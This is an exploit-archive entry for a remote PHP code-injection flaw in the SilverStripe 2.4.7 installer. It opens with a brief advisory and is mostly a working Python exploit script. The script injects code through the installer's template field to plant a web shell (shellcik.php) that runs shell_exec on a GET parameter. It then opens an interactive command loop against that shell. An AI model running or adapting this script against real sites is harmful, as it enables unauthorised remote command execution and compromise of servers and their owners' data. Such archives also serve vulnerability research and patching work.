source: http://www.securityfocus.com/bid/53282/info

SilverStripe is prone to a remote PHP code-injection vulnerability.

An attacker can exploit this issue to inject and execute arbitrary PHP code in the context of the affected application. This may facilitate a compromise of the application and the underlying system; other attacks are also possible.

SilverStripe 2.4.7 is vulnerable; other versions may also be affected. 

#!/usr/bin/env python
# -*- coding:utf-8 -*-
import httplib, urllib, urllib2,sys, getopt
 
def Menu():
    print "\n\n-------------------------------------------------------"
    print "-Kullanim Klavuzu [ USAGE ]               "
    print "-------------------------------------------------------"
    print "- Temel Kullanim - I [ Default Usage ] :                  "
    print "-        python exo.py www.target.com /            \n"
    print "- Temel Kullanim - II [ Default Usage ] :                 "
    print "-        python exo.py www.target.com /path/          \n"
if (len(sys.argv) <= 2) or (len(sys.argv) > 3):
    Menu()
    exit(1)
host = sys.argv[1]
path = sys.argv[2]
 
print " [+] Exploit ediliyor..!"
payload="blackcandy');fwrite(fopen("
payload+='"../shellcik.php","w"), '
payload+="'<?php $gelen"
payload+='=@$_GET["gelen"]; echo shell_exec($gelen);?>'
parametreler = urllib.urlencode({'db[type]':'MySQLDatabase',
'db[MySQLDatabase][server]':'localhost',
'db[MySQLDatabase][username]':'root',
'db[MySQLDatabase][password]':'qwe123',
'db[MySQLDatabase][database]':'SS_mysite',
'db[MSSQLDatabase][server]':'localhost',
'db[MSSQLDatabase][username]':'root',
'db[MSSQLDatabase][password]':'qwe123',
'db[MSSQLDatabase][database]':'SS_mysite',
'db[PostgreSQLDatabase][server]':'localhost',
'db[PostgreSQLDatabase][username]':'root',
'db[PostgreSQLDatabase][password]':'qwe123',
'db[PostgreSQLDatabase][database]':'SS_mysite',
'db[SQLiteDatabase][path]':'/var/www/SilverStripe/assets/.db',
'db[SQLiteDatabase][database]':'SS_mysite',
'admin[username]':'admin',
'admin[password]':'qwe123',
'locale':'en_US',
'template':payload,
'stats':'on',
'go':'Installing SilverStripe...'})
print " [+]Parametreler olusturuldu [ Params Generated For Http Request ]"
basliklar = {"Content-type": "application/x-www-form-urlencoded",
             "Accept": "text/plain",
             "User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:11.0) Gecko/20100101 Firefox/11.0",
             "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
             "Accept-Language":"en-us,en;q=0.5",
             "Accept-Encoding":"gzip, deflate",
             "Connection":"keep-alive",
             "Referer":"http://" + host + path+"install.php",
             "Cookie":"alc_enc=1%3Aa9dbf14198a8f6bd9dd2d2c3e41e7164fb206d76; PastMember=1; PHPSESSID=0d7k4e661jd96i0u64vij68am3; phpbb3_srzvs_k=; phpbb3_srzvs_u=2; phpbb3_srzvs_sid=ede0a17fc1f375d6a633f291119c92d7; style_cookie=null; PHPSESSID=j7nr6uro3jc5tulodfeoum3u90; fws_cust=mince%232%23d41d8cd98f00b204e9800998ecf8427e"
}
print " [+]Basliklar olusturuldu [ Headers Generated For Http Request ]"
conn = httplib.HTTPConnection("localhost:80")
conn.request("POST",str(path) +"install.php",parametreler,basliklar)
responce = conn.getresponse()
if responce.status != 200:
    print "[+]Http Hatasi : " + responce.status + "\n"
    print "Cant Exploit!:("
if responce.status == 200:
    komut=""
    while( komut != "exit" ):
        komut = urllib.quote_plus(str(raw_input("Shell :) => ")))
        print urllib2.urlopen("http://" + host + path+"shellcik.php?gelen="+komut).read()